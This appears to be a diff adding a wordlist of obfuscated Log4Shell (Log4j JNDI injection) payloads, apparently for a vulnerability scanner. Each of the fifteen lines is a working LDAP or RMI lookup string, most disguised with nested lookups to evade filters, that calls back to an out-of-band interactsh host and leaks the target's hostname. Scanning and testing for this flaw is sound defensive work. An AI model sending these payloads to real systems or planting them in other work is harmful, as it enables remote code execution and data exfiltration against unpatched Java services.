@@ -1,0 +1,15 @@
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.{{interactsh-url}}/a}
+${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//${hostName}.{{interactsh-url}}/a}
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://${hostName}.{{interactsh-url}}/poc}
+${${::-j}ndi:rmi://${hostName}.{{interactsh-url}}/ass}
+${jndi:rmi://${hostName}.{{interactsh-url}}}
+${${lower:jndi}:${lower:rmi}://${hostName}.{{interactsh-url}}/poc}
+${${lower:${lower:jndi}}:${lower:rmi}://${hostName}.{{interactsh-url}}/poc}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://${hostName}.{{interactsh-url}}/poc}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://${hostName}.{{interactsh-url}}/poc}
+${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//${hostName}.{{interactsh-url}}/a}
+${j${k8s:k5:-ND}i${sd:k5:-:}ldap://${hostName}.{{interactsh-url}}:1389/o}
+${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.{{interactsh-url}}}
+${jndi:ldap://127.0.0.1#${hostName}.{{interactsh-url}}/a}
+${jndi${123%25ff:-}:ldap://{{interactsh-url}}:443/a}
+${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{interactsh-url}}:443/o}
